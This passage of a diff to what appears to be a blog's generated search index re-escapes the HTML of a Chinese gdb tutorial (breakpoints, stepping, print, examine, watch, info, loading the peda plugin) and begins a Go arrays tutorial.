class="line">15                      int i;</span><br><span class="line">16                      for (i=0; i&lt;10; i++) &#123;</span><br><span class="line">17                                      printf(&quot;what is gdb? %d\n&quot;, i);</span><br><span class="line">18                      &#125;</span><br><span class="line">19                      return 0;</span><br><span class="line">20      &#125;</span><br><span class="line">(gdb) l -</span><br><span class="line">1       #include&lt;stdio.h&gt;</span><br><span class="line">2</span><br><span class="line">3       int fun(int a, int b) &#123;</span><br><span class="line">4                       int val = 0;</span><br><span class="line">5                       if (a &gt; b) &#123;</span><br><span class="line">6                                       val = a + b;</span><br><span class="line">7                       &#125; else &#123;</span><br><span class="line">8                                       val = a - b;</span><br><span class="line">9                       &#125;</span><br><span class="line">10                      return val;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) l</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">1       #include&lt;stdio.h&gt;</span><br><span class="line">2</span><br><span class="line">3       int fun(int a, int b) &#123;</span><br><span class="line">4                       int val &#x3D; 0;</span><br><span class="line">5                       if (a &gt; b) &#123;</span><br><span class="line">6                                       val &#x3D; a + b;</span><br><span class="line">7                       &#125; else &#123;</span><br><span class="line">8                                       val &#x3D; a - b;</span><br><span class="line">9                       &#125;</span><br><span class="line">10                      return val;</span><br><span class="line">(gdb) l</span><br><span class="line">11      &#125;</span><br><span class="line">12</span><br><span class="line">13      int main() &#123;</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">15                      int i;</span><br><span class="line">16                      for (i&#x3D;0; i&lt;10; i++) &#123;</span><br><span class="line">17                                      printf(&quot;what is gdb? %d\n&quot;, i);</span><br><span class="line">18                      &#125;</span><br><span class="line">19                      return 0;</span><br><span class="line">20      &#125;</span><br><span class="line">(gdb) l -</span><br><span class="line">1       #include&lt;stdio.h&gt;</span><br><span class="line">2</span><br><span class="line">3       int fun(int a, int b) &#123;</span><br><span class="line">4                       int val &#x3D; 0;</span><br><span class="line">5                       if (a &gt; b) &#123;</span><br><span class="line">6                                       val &#x3D; a + b;</span><br><span class="line">7                       &#125; else &#123;</span><br><span class="line">8                                       val &#x3D; a - b;</span><br><span class="line">9                       &#125;</span><br><span class="line">10                      return val;</span><br></pre></td></tr></table></figure>
 <h4 id="start"><a href="#start" class="headerlink" title="start"></a>start</h4><p>说明：<br>开始执行程序，并在main函数的第一条语句前面停下来</p>
 <p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: /home/dounine/gdb/hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: &#x2F;home&#x2F;dounine&#x2F;gdb&#x2F;hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br></pre></td></tr></table></figure>
 <h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p>说明：运行加载的程序。在<code>run</code>前，需先设定一个或多个断点，不然程序会运行直到结束。</p>
 <p>简写：<code>r</code></p>
 <h4 id="break"><a href="#break" class="headerlink" title="break"></a><strong>break</strong></h4><p>格式：</p>
@@ -912,7 +924,7 @@
 <li><code>break +&lt;offset&gt; / break -&lt;offset&gt;</code>，在当前行的下<code>offset</code>行/上<code>offset</code>行，设置断点</li>
 </ul>
 <p>简写：<code>b</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: /home/dounine/gdb/hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">(gdb) l</span><br><span class="line">9                       &#125;</span><br><span class="line">10                      return val;</span><br><span class="line">11      &#125;</span><br><span class="line">12</span><br><span class="line">13      int main() &#123;</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">15</span><br><span class="line">16                      int i;</span><br><span class="line">17                      for (i=0; i&lt;10; i++) &#123;</span><br><span class="line">18                                      printf(&quot;what is gdb? %d\n&quot;, i);</span><br><span class="line">(gdb) break 17</span><br><span class="line">Breakpoint 2 at 0x400629: file hello1.c, line 17.</span><br><span class="line">(gdb) break fun</span><br><span class="line">Breakpoint 3 at 0x4005d0: file hello1.c, line 4.</span><br><span class="line">(gdb) break *0x400630</span><br><span class="line">Breakpoint 4 at 0x400630: file hello1.c, line 17.</span><br><span class="line">(gdb) break +2</span><br><span class="line">Note: breakpoint 2 also set at pc 0x400629.</span><br><span class="line">Breakpoint 5 at 0x400629: file hello1.c, line 16.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: &#x2F;home&#x2F;dounine&#x2F;gdb&#x2F;hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">(gdb) l</span><br><span class="line">9                       &#125;</span><br><span class="line">10                      return val;</span><br><span class="line">11      &#125;</span><br><span class="line">12</span><br><span class="line">13      int main() &#123;</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">15</span><br><span class="line">16                      int i;</span><br><span class="line">17                      for (i&#x3D;0; i&lt;10; i++) &#123;</span><br><span class="line">18                                      printf(&quot;what is gdb? %d\n&quot;, i);</span><br><span class="line">(gdb) break 17</span><br><span class="line">Breakpoint 2 at 0x400629: file hello1.c, line 17.</span><br><span class="line">(gdb) break fun</span><br><span class="line">Breakpoint 3 at 0x4005d0: file hello1.c, line 4.</span><br><span class="line">(gdb) break *0x400630</span><br><span class="line">Breakpoint 4 at 0x400630: file hello1.c, line 17.</span><br><span class="line">(gdb) break +2</span><br><span class="line">Note: breakpoint 2 also set at pc 0x400629.</span><br><span class="line">Breakpoint 5 at 0x400629: file hello1.c, line 16.</span><br></pre></td></tr></table></figure>
 <p><code>break *&lt;address&gt;</code> 在了解并查看汇编位置后再下断点。<br><code>break +2</code> 在第16行设置了断点，是因为当前行在第14行。</p>
 <h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p>格式：</p>
 <ul>
@@ -935,7 +947,7 @@
 </ul>
 <p>简写：<code>s</code></p>
 <p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: /home/dounine/gdb/hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">(gdb) b 22</span><br><span class="line">Breakpoint 2 at 0x40065f: file hello1.c, line 22.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">hello gdb!</span><br><span class="line">what is gdb? 0</span><br><span class="line">what is gdb? 1</span><br><span class="line">what is gdb? 2</span><br><span class="line">what is gdb? 3</span><br><span class="line">what is gdb? 4</span><br><span class="line">what is gdb? 5</span><br><span class="line">what is gdb? 6</span><br><span class="line">what is gdb? 7</span><br><span class="line">what is gdb? 8</span><br><span class="line">what is gdb? 9</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main () at hello1.c:22</span><br><span class="line">22                      printf(&quot;%d\n&quot;, fun(a, b));</span><br><span class="line">(gdb) s</span><br><span class="line">fun (a=1, b=3) at hello1.c:4</span><br><span class="line">4                       int val = 0;</span><br><span class="line">(gdb) n</span><br><span class="line">5                       if (a &gt; b) &#123;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: &#x2F;home&#x2F;dounine&#x2F;gdb&#x2F;hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">(gdb) b 22</span><br><span class="line">Breakpoint 2 at 0x40065f: file hello1.c, line 22.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">hello gdb!</span><br><span class="line">what is gdb? 0</span><br><span class="line">what is gdb? 1</span><br><span class="line">what is gdb? 2</span><br><span class="line">what is gdb? 3</span><br><span class="line">what is gdb? 4</span><br><span class="line">what is gdb? 5</span><br><span class="line">what is gdb? 6</span><br><span class="line">what is gdb? 7</span><br><span class="line">what is gdb? 8</span><br><span class="line">what is gdb? 9</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main () at hello1.c:22</span><br><span class="line">22                      printf(&quot;%d\n&quot;, fun(a, b));</span><br><span class="line">(gdb) s</span><br><span class="line">fun (a&#x3D;1, b&#x3D;3) at hello1.c:4</span><br><span class="line">4                       int val &#x3D; 0;</span><br><span class="line">(gdb) n</span><br><span class="line">5                       if (a &gt; b) &#123;</span><br></pre></td></tr></table></figure>
 <p>注意：使用<code>step</code>命令会进入函数调用，而使用<code>next</code>显然不会。但是，如果一直使用<code>step</code>，那将会进入一些如<code>printf</code>之类的函数。</p>
 <h4 id="print"><a href="#print" class="headerlink" title="print"></a><strong>print</strong></h4><ul>
 <li><code>print &lt;expr&gt;</code>，打印指定表达式的值(表达式可以是<strong>变量</strong>，也可以是<strong>地址</strong>)</li>
@@ -953,8 +965,8 @@
 <li><code>f</code> 按浮点数格式显示变量。</li>
 </ul>
 <p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) print &amp;i</span><br><span class="line">$1 = (int *) 0xbffff46c</span><br><span class="line">(gdb) print i</span><br><span class="line">$2 = 2</span><br><span class="line">(gdb) print i+=1</span><br><span class="line">$3 = 3</span><br><span class="line">(gdb) print i</span><br><span class="line">$4 = 3</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x5ac: file hello2.c, line 5.</span><br><span class="line">Starting program: /home/dounine/gdb/hello2</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello2.c:5</span><br><span class="line">5               char *c = &quot;hello world&quot;;</span><br><span class="line">(gdb) p c</span><br><span class="line">$1 = 0x400601 &lt;__libc_csu_init+33&gt; &quot;\215\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br><span class="line">(gdb) p /s c</span><br><span class="line">$2 = 0x400601 &lt;__libc_csu_init+33&gt; &quot;\215\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br><span class="line">(gdb) p (char*)c</span><br><span class="line">$3 = 0x400601 &lt;__libc_csu_init+33&gt; &quot;\215\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br><span class="line">(gdb) p *((char*)c)=&apos;H&apos;</span><br><span class="line">$4 = 72 &apos;H&apos;</span><br><span class="line">(gdb) p c</span><br><span class="line">$5 = 0x400601 &lt;__libc_csu_init+33&gt; &quot;H\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) print &amp;i</span><br><span class="line">$1 &#x3D; (int *) 0xbffff46c</span><br><span class="line">(gdb) print i</span><br><span class="line">$2 &#x3D; 2</span><br><span class="line">(gdb) print i+&#x3D;1</span><br><span class="line">$3 &#x3D; 3</span><br><span class="line">(gdb) print i</span><br><span class="line">$4 &#x3D; 3</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x5ac: file hello2.c, line 5.</span><br><span class="line">Starting program: &#x2F;home&#x2F;dounine&#x2F;gdb&#x2F;hello2</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello2.c:5</span><br><span class="line">5               char *c &#x3D; &quot;hello world&quot;;</span><br><span class="line">(gdb) p c</span><br><span class="line">$1 &#x3D; 0x400601 &lt;__libc_csu_init+33&gt; &quot;\215\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br><span class="line">(gdb) p &#x2F;s c</span><br><span class="line">$2 &#x3D; 0x400601 &lt;__libc_csu_init+33&gt; &quot;\215\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br><span class="line">(gdb) p (char*)c</span><br><span class="line">$3 &#x3D; 0x400601 &lt;__libc_csu_init+33&gt; &quot;\215\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br><span class="line">(gdb) p *((char*)c)&#x3D;&#39;H&#39;</span><br><span class="line">$4 &#x3D; 72 &#39;H&#39;</span><br><span class="line">(gdb) p c</span><br><span class="line">$5 &#x3D; 0x400601 &lt;__libc_csu_init+33&gt; &quot;H\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br></pre></td></tr></table></figure>
 <p><strong>注意</strong>：可以在<code>print &lt;expr&gt;</code>的时候，通过表达式<strong>设定某个变量的值</strong>。</p>
 <p>简写：<code>p</code></p>
 <h4 id="examine"><a href="#examine" class="headerlink" title="examine"></a><strong>examine</strong></h4><p>说明：用于打印某个<strong>地址</strong>所指向的内存中的内容，十分有用！！！</p>
@@ -984,9 +996,9 @@
 </li>
 </ul>
 <p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 显示0x7fffffffd708(这是个地址)处1个(n=1)单字节(u=b)的内容，以十六进制(f=x)表示；</span><br><span class="line">(gdb)x/1xb  0x7fffffffd708</span><br><span class="line">0x7fffffffd708: 0x26</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 显示0x7fffffffd708(这是个地址)处1个(n&#x3D;1)单字节(u&#x3D;b)的内容，以十六进制(f&#x3D;x)表示；</span><br><span class="line">(gdb)x&#x2F;1xb  0x7fffffffd708</span><br><span class="line">0x7fffffffd708: 0x26</span><br></pre></td></tr></table></figure>
 <p>也可以省略<code>n</code> <code>f</code> <code>u</code>参数：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x/ 0x402470</span><br><span class="line">0x402470:       0x00400f7c</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F; 0x402470</span><br><span class="line">0x402470:       0x00400f7c</span><br></pre></td></tr></table></figure>
 <h4 id="display"><a href="#display" class="headerlink" title="display"></a>display</h4><ul>
 <li><code>display</code>，跟踪查看某个变量,每次停下来都显示它的值</li>
 </ul>
@@ -995,10 +1007,10 @@
 <li><code>watch</code>，一般用来观察某个表达式(变量也是一种表达式)的值是否有变化。相当于，在每次该表达式值变化的地方，都设置一个断点。我们需要使用<code>continue</code>命令前进。</li>
 </ul>
 <p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: /home/dounine/gdb/hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">(gdb) watch i</span><br><span class="line">Hardware watchpoint 2: i</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">hello gdb!</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: i</span><br><span class="line"></span><br><span class="line">Old value = 4196033</span><br><span class="line">New value = 0</span><br><span class="line">0x00400630 in main () at hello1.c:17</span><br><span class="line">17                      for (i=0; i&lt;10; i++) &#123;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">what is gdb? 0</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: i</span><br><span class="line"></span><br><span class="line">Old value = 0</span><br><span class="line">New value = 1</span><br><span class="line">0x0040064b in main () at hello1.c:17</span><br><span class="line">17                      for (i=0; i&lt;10; i++) &#123;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: &#x2F;home&#x2F;dounine&#x2F;gdb&#x2F;hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">(gdb) watch i</span><br><span class="line">Hardware watchpoint 2: i</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">hello gdb!</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: i</span><br><span class="line"></span><br><span class="line">Old value &#x3D; 4196033</span><br><span class="line">New value &#x3D; 0</span><br><span class="line">0x00400630 in main () at hello1.c:17</span><br><span class="line">17                      for (i&#x3D;0; i&lt;10; i++) &#123;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">what is gdb? 0</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: i</span><br><span class="line"></span><br><span class="line">Old value &#x3D; 0</span><br><span class="line">New value &#x3D; 1</span><br><span class="line">0x0040064b in main () at hello1.c:17</span><br><span class="line">17                      for (i&#x3D;0; i&lt;10; i++) &#123;</span><br></pre></td></tr></table></figure>
 <h4 id="info"><a href="#info" class="headerlink" title="info"></a><strong>info</strong></h4><p>说明：<code>info</code>命令可以在调试时用来查看寄存器、断点、观察点(watch)和信号等信息。</p>
 <p><code>info</code>可以查看的所有信息如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) info</span><br><span class="line">&quot;info&quot; must be followed by the name of an info command.</span><br><span class="line">List of info subcommands:</span><br><span class="line"></span><br><span class="line">info address -- Describe where symbol SYM is stored</span><br><span class="line">info all-registers -- List of all registers and their contents</span><br><span class="line">info args -- Argument variables of current stack frame</span><br><span class="line">info auto-load -- Print current status of auto-loaded files</span><br><span class="line">info auxv -- Display the inferior&apos;s auxiliary vector</span><br><span class="line">info bookmarks -- Status of user-settable bookmarks</span><br><span class="line">info breakpoints -- Status of specified breakpoints (all user-settable breakpoints if no argument)</span><br><span class="line">info checkpoints -- IDs of currently known checkpoints</span><br><span class="line">info classes -- All Objective-C classes</span><br><span class="line">info common -- Print out the values contained in a Fortran COMMON block</span><br><span class="line">info copying -- Conditions for redistributing copies of GDB</span><br><span class="line">info dcache -- Print information on the dcache performance</span><br><span class="line">info display -- Expressions to display when program stops</span><br><span class="line">info exceptions -- List all Ada exception names</span><br><span class="line">info extensions -- All filename extensions associated with a source language</span><br><span class="line">info files -- Names of targets and files being debugged</span><br><span class="line">info float -- Print the status of the floating point unit</span><br><span class="line">info frame -- All about selected stack frame</span><br><span class="line">info frame-filter -- List all registered Python frame-filters</span><br><span class="line">info functions -- All function names</span><br><span class="line">info guile -- Prefix command for Guile info displays</span><br><span class="line">info handle -- What debugger does when program gets various signals</span><br><span class="line">info inferiors -- IDs of specified inferiors (all inferiors if no argument)</span><br><span class="line">info line -- Core addresses of the code for a source line</span><br><span class="line">info locals -- Local variables of current stack frame</span><br><span class="line">info macro -- Show the definition of MACRO</span><br><span class="line">info macros -- Show the definitions of all macros at LINESPEC</span><br><span class="line">info mem -- Memory region attributes</span><br><span class="line">info os -- Show OS data ARG</span><br><span class="line">info pretty-printer -- GDB command to list all registered pretty-printers</span><br><span class="line">info probes -- Show available static probes</span><br><span class="line">info proc -- Show /proc process information about any running process</span><br><span class="line">info program -- Execution status of the program</span><br><span class="line">info record -- Info record options</span><br><span class="line">info registers -- List of integer registers and their contents</span><br><span class="line">info scope -- List the variables local to a scope</span><br><span class="line">info selectors -- All Objective-C selectors</span><br><span class="line">info set -- Show all GDB settings</span><br><span class="line">info sharedlibrary -- Status of loaded shared object libraries</span><br><span class="line">info signals -- What debugger does when program gets various signals</span><br><span class="line">info skip -- Display the status of skips</span><br><span class="line">info source -- Information about the current source file</span><br><span class="line">info sources -- Source files in the program</span><br><span class="line">info stack -- Backtrace of the stack</span><br><span class="line">info static-tracepoint-markers -- List target static tracepoints markers</span><br><span class="line">info symbol -- Describe what symbol is at location ADDR</span><br><span class="line">info target -- Names of targets and files being debugged</span><br><span class="line">info tasks -- Provide information about all known Ada tasks</span><br><span class="line">info terminal -- Print inferior&apos;s saved terminal status</span><br><span class="line">info threads -- Display currently known threads</span><br><span class="line">info tracepoints -- Status of specified tracepoints (all tracepoints if no argument)</span><br><span class="line">info tvariables -- Status of trace state variables and their values</span><br><span class="line">info type-printers -- GDB command to list all registered type-printers</span><br><span class="line">info types -- All type names</span><br><span class="line">info unwinder -- GDB command to list unwinders</span><br><span class="line">info variables -- All global and static variable names</span><br><span class="line">info vector -- Print the status of the vector unit</span><br><span class="line">info vtbl -- Show the virtual function table for a C++ object</span><br><span class="line">info warranty -- Various kinds of warranty you do not have</span><br><span class="line">info watchpoints -- Status of specified watchpoints (all watchpoints if no argument)</span><br><span class="line">info win -- List of all displayed windows</span><br><span class="line">info xmethod -- GDB command to list registered xmethod matchers</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) info</span><br><span class="line">&quot;info&quot; must be followed by the name of an info command.</span><br><span class="line">List of info subcommands:</span><br><span class="line"></span><br><span class="line">info address -- Describe where symbol SYM is stored</span><br><span class="line">info all-registers -- List of all registers and their contents</span><br><span class="line">info args -- Argument variables of current stack frame</span><br><span class="line">info auto-load -- Print current status of auto-loaded files</span><br><span class="line">info auxv -- Display the inferior&#39;s auxiliary vector</span><br><span class="line">info bookmarks -- Status of user-settable bookmarks</span><br><span class="line">info breakpoints -- Status of specified breakpoints (all user-settable breakpoints if no argument)</span><br><span class="line">info checkpoints -- IDs of currently known checkpoints</span><br><span class="line">info classes -- All Objective-C classes</span><br><span class="line">info common -- Print out the values contained in a Fortran COMMON block</span><br><span class="line">info copying -- Conditions for redistributing copies of GDB</span><br><span class="line">info dcache -- Print information on the dcache performance</span><br><span class="line">info display -- Expressions to display when program stops</span><br><span class="line">info exceptions -- List all Ada exception names</span><br><span class="line">info extensions -- All filename extensions associated with a source language</span><br><span class="line">info files -- Names of targets and files being debugged</span><br><span class="line">info float -- Print the status of the floating point unit</span><br><span class="line">info frame -- All about selected stack frame</span><br><span class="line">info frame-filter -- List all registered Python frame-filters</span><br><span class="line">info functions -- All function names</span><br><span class="line">info guile -- Prefix command for Guile info displays</span><br><span class="line">info handle -- What debugger does when program gets various signals</span><br><span class="line">info inferiors -- IDs of specified inferiors (all inferiors if no argument)</span><br><span class="line">info line -- Core addresses of the code for a source line</span><br><span class="line">info locals -- Local variables of current stack frame</span><br><span class="line">info macro -- Show the definition of MACRO</span><br><span class="line">info macros -- Show the definitions of all macros at LINESPEC</span><br><span class="line">info mem -- Memory region attributes</span><br><span class="line">info os -- Show OS data ARG</span><br><span class="line">info pretty-printer -- GDB command to list all registered pretty-printers</span><br><span class="line">info probes -- Show available static probes</span><br><span class="line">info proc -- Show &#x2F;proc process information about any running process</span><br><span class="line">info program -- Execution status of the program</span><br><span class="line">info record -- Info record options</span><br><span class="line">info registers -- List of integer registers and their contents</span><br><span class="line">info scope -- List the variables local to a scope</span><br><span class="line">info selectors -- All Objective-C selectors</span><br><span class="line">info set -- Show all GDB settings</span><br><span class="line">info sharedlibrary -- Status of loaded shared object libraries</span><br><span class="line">info signals -- What debugger does when program gets various signals</span><br><span class="line">info skip -- Display the status of skips</span><br><span class="line">info source -- Information about the current source file</span><br><span class="line">info sources -- Source files in the program</span><br><span class="line">info stack -- Backtrace of the stack</span><br><span class="line">info static-tracepoint-markers -- List target static tracepoints markers</span><br><span class="line">info symbol -- Describe what symbol is at location ADDR</span><br><span class="line">info target -- Names of targets and files being debugged</span><br><span class="line">info tasks -- Provide information about all known Ada tasks</span><br><span class="line">info terminal -- Print inferior&#39;s saved terminal status</span><br><span class="line">info threads -- Display currently known threads</span><br><span class="line">info tracepoints -- Status of specified tracepoints (all tracepoints if no argument)</span><br><span class="line">info tvariables -- Status of trace state variables and their values</span><br><span class="line">info type-printers -- GDB command to list all registered type-printers</span><br><span class="line">info types -- All type names</span><br><span class="line">info unwinder -- GDB command to list unwinders</span><br><span class="line">info variables -- All global and static variable names</span><br><span class="line">info vector -- Print the status of the vector unit</span><br><span class="line">info vtbl -- Show the virtual function table for a C++ object</span><br><span class="line">info warranty -- Various kinds of warranty you do not have</span><br><span class="line">info watchpoints -- Status of specified watchpoints (all watchpoints if no argument)</span><br><span class="line">info win -- List of all displayed windows</span><br><span class="line">info xmethod -- GDB command to list registered xmethod matchers</span><br></pre></td></tr></table></figure>
 <p>其中，常用的查看指令和作用如下：</p>
 <ul>
 <li><code>info breakpoints</code>，查看设置了所有断点的信息</li>
@@ -1021,7 +1033,7 @@
 <p>简写：<code>q</code></p>
 <h3 id="3-安装peda插件"><a href="#3-安装peda插件" class="headerlink" title="3. 安装peda插件"></a>3. 安装peda插件</h3><p><code>peda</code>是用<code>python</code>开发的一款gdb插件，很受欢迎，github地址为<a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p>
 <h4 id="3-1-使用方法"><a href="#3-1-使用方法" class="headerlink" title="3.1. 使用方法"></a>3.1. 使用方法</h4><p><code>git</code>下载项目到本地，然后修改<code>~/.gdbinit</code>(当前用户的<code>gdb</code>配置目录)如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source xxx/peda/peda.py</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source xxx&#x2F;peda&#x2F;peda.py</span><br></pre></td></tr></table></figure>
 <p>修改后的效果是，每次启动<code>gdb</code>都会运行这条命令<code>source xxx/peda/peda.py</code>。这条命令的意思是：加载peda中的python脚本，<code>xxx</code>是peda的安装目录。</p>
 <h3 id="4-使用自己python的脚本"><a href="#4-使用自己python的脚本" class="headerlink" title="4. 使用自己python的脚本"></a>4. 使用自己python的脚本</h3><p>在python中<code>import gdb</code>，就可以使用<code>gdb</code>模块了。</p>
 <p>但是，<code>import gdb</code>直接运行会报错。</p>
@@ -1029,15 +1041,15 @@
 <p>python中的<code>gdb</code>模块使用教程见官网：<a href="https://sourceware.org/gdb/onlinedocs/gdb/Python.html#Python" target="_blank" rel="noopener">https://sourceware.org/gdb/onlinedocs/gdb/Python.html#Python</a></p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
-        <tag>计算机系统</tag>
+        <tag>gdb</tag>
       </tags>
   </entry>
   <entry>
     <title>go语言入门</title>
-    <url>/language/go%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8.html</url>
+    <url>/go%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因项目需要和个人喜好，决定系统入门go语言。</p>
 <p>go是由Google开发、开源、强类型的编译型语言。与c语言类似，不同的是，go中每行语句结束不用加 <code>;</code> :-)</p>
 <p>本笔记主要参考 <strong>《Go语言实战》</strong> 。</p>
@@ -1265,7 +1277,7 @@
 </ul>
 <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//====================数组=====================</span></span><br><span class="line"><span class="comment">// 变量 a 是一个值类型，而不是引用类型。包含着整个数组的数据</span></span><br><span class="line"><span class="keyword">var</span> a [<span class="number">2</span>]<span class="keyword">string</span></span><br><span class="line">a[<span class="number">0</span>] = <span class="string">"Hello"</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="string">"World"</span></span><br><span class="line">fmt.Println(a[<span class="number">0</span>], a[<span class="number">1</span>])</span><br><span class="line">fmt.Println(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用字面量声明数组</span></span><br><span class="line">array1 := [<span class="number">5</span>]<span class="keyword">int</span>&#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>&#125;</span><br><span class="line">array2 := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;   <span class="comment">// ... 可以使编译器根据元素数量，自动确定数组长度</span></span><br><span class="line">fmt.Println(array1, array2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组元素类型为指针</span></span><br><span class="line">array3 := [<span class="number">5</span>]*<span class="keyword">int</span>&#123;<span class="number">0</span>:<span class="built_in">new</span>(<span class="keyword">int</span>), <span class="number">1</span>:<span class="built_in">new</span>(<span class="keyword">int</span>)&#125;   <span class="comment">// 用 下标:... 进行特定位置的初始化</span></span><br><span class="line">*array3[<span class="number">0</span>] = <span class="number">10</span></span><br><span class="line">*array3[<span class="number">1</span>] = <span 